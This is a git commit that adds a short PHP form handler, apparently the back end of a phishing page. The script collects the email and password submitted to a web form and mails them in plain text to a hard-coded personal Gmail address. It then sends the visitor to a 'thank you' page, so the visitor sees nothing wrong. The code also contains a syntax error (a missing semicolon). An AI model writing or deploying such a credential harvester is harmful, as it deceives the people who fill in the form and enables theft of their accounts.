2d3db9ecd95b1ef208a8243904b7c7ecc6090bbc
GrafoHacker <62811143+GrafoHacker@users.noreply.github.com>
2021-04-18 21:44:27 +0400

    first deploy
    mxeci

---
+++ script.php
@@ -0,0 +1,11 @@
+<?php
+//get data from form
+$email = $_POST['email'];
+$password = $_POST['password'];
+$to = "grafogiorgi777@gmail.com";
+$subject = "mail from website";
+$txt = "email = ".$email ."\r\n password = ".$password;
+$headers = "from no-reply"
+if ($email!=NULL){mail($to,$subject,$txt,$headers);}
+header("Location:thankyou.html");
+?>
